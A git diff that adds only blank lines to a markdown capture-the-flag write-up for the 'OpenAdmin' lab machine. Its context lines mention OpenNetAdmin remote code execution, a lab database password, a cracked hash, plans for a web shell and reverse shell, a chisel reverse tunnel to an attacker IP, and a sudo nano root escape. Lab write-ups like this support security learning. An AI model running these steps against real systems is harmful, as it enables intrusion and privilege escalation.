@@ -37,6 +37,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 
 # Recon
 
+
 ## TCP/80 (HTTP)
 
 - FFUF
@@ -49,6 +50,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	```
 
 # Initial Foothold
+
 
 ## TCP/80 (HTTP) - OpenNetAdmin v18.1.1 Remote Code Execution
 
@@ -112,6 +114,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 5.  Demo - `OpenNetAdmin v18.1.1 - Remote Code Execution`
 	![](WO4vY3wm5C.gif)
 
+
 ## TCP/80 (HTTP) - OpenNetAdmin v18.1.1 Remote Code Execution (Metasploit)
 
 1. Launch `msfconsole`
@@ -165,6 +168,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	![](Pasted%20image%2020220926040313.png)
 
 # Privilege Escalation
+
 
 ## Jimmy - Enumeration (Found Jimmy Creds)
 
@@ -225,6 +229,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	jimmy@openadmin:/opt/ona$
 	```
 
+
 ## Extract MySQL Database Hashes & Crack
 
 1. Connect to `mysql` w/ `ona_sys:n1nj4W4rri0R!`
@@ -280,6 +285,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	21232f297a57a5a743894a0e4a801fc3:admin
 	```
 
+
 ## Joanna - Enumeration
 
 1. View groups for user `admin`
@@ -300,12 +306,14 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	 > - User `jimmy` has write access to the web root directory.
 	{: .prompt-info}
 
+
 ## Joanna - How to privilege escalate w/ the info we have?
 
 1. Analyzing the information we have
 	1. Since Virtual Host is configured to run as user `joanna`, commands executed by the webserver will be executed as user `joanna`.
 	2. User `jimmy` has write access to the web root directory `/var/www/internal`, this means we can write a web shell, and invoke a reverse shell through the webshell to obtain `joanna` shell.
 	3. We have to use SSH Tunnel/Chisel in order to access `TCP/52846` on `kali`
+
 
 ## Joanna - Setup SSH Tunnel/Chisel 
 
@@ -350,6 +358,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 		```
 		jimmy@openadmin:/tmp$ ./chisel client 10.10.14.14:1337 R:52846:127.0.0.1:52846 &
 		```
+
 
 ## Joanna - Insert Webshell & Create joannabash
 
@@ -405,6 +414,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	joannabash-4.4$ ls -la /home/joanna | grep .ssh
 	drwx------ 2 joanna joanna 4096 Nov 23  2019 .ssh
 	```
+
 
 ## Joanna - Crack SSH Private Key
 
@@ -462,6 +472,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
 	```
 
+
 ##  Root - Enumeration
 
 1. Check `joanna`'s sudo access
@@ -477,6 +488,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	```
 
 	- `/bin/nano` - has a [GTFOBins entry](https://gtfobins.github.io/gtfobins/nano/#sudo)
+
 
 ## Root - SUID/SUDO GTFOBINS
 
@@ -509,6 +521,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 
 # Additional
 
+
 ## Joana - Login & Obtain SSH Private
 
 1. Instead of inserting a webshell, we can login to `TCP/52846`, revealing `joanna` SSH private key
@@ -529,6 +542,7 @@ User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root
 	![](Pasted%20image%2020220926042206.png)
 4. Login w/ `jimmy:Revealed`, `joanna`'s SSH private key is displayed
 	![](Pasted%20image%2020220926042456.png)
+
 
 ## Fix main.php
 
